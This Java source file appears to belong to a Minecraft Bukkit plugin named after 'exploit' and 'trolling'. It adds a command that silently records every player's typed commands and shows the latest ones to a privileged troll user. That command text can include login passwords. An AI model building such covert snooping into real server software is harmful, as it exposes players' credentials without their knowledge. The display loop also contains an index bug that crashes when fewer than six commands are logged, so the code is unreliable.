package de.blexploit.command.cmds;

import java.util.ArrayList;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import de.blexploit.command.Command;
import de.blexploit.players.create.MittrollerEntity;

public final class CommandLogger extends Command implements Listener {

	public static ArrayList<CmdLog> latesCommands = new ArrayList<CmdLog>();

	public CommandLogger() {
		super("commandlogger", "Schaue dir die letzten Befehle an");
	}

	@EventHandler
	private void onPlayerCommand(final PlayerCommandPreprocessEvent e) {
		final CmdLog cmdLog = new CmdLog(e.getPlayer(), e.getMessage());
		latesCommands.add(0, cmdLog);
		if (latesCommands.size() > 50) {
			latesCommands.remove(50);
		}
	}

	@Override
	public void run(final String[] args, final MittrollerEntity mt) {
		mt.getPlayer().sendMessage(ChatColor.BLUE + "-----------Letzte Befehle-----------");
		for (int i = 0; i < 6; i++) {
			if (i != latesCommands.size()) {
				final CmdLog cmdLog = latesCommands.get(i);
				mt.getPlayer().sendMessage(ChatColor.GOLD + "[" + ChatColor.RED + (i + 1) + ChatColor.GOLD + "] "
						+ ChatColor.YELLOW + cmdLog.getPlayer().getName() + ": " + ChatColor.GRAY + cmdLog.fullCommand);
			}
		}
		mt.getPlayer().sendMessage(ChatColor.BLUE + "-----------Letzte Befehle-----------");

	}

	public class CmdLog {
		private final Player p;
		private final String fullCommand;
		private final String command;
		private final String[] args;

		public Player getPlayer() {
			return this.p;
		}

		public String getFullCommand() {
			return this.fullCommand;
		}

		public String getCommand() {
			return this.command;
		}

		public String[] getArgs() {
			return this.args;
		}

		public CmdLog(final Player p, final String fullCommand) {
			this.p = p;
			this.fullCommand = fullCommand;
			final String args[] = fullCommand.split(" ");

			if (args.length == 0) {
				this.command = fullCommand;
				this.args = null;
			} else {
				this.command = args[0];
				this.args = args;
			}
		}

	}

}
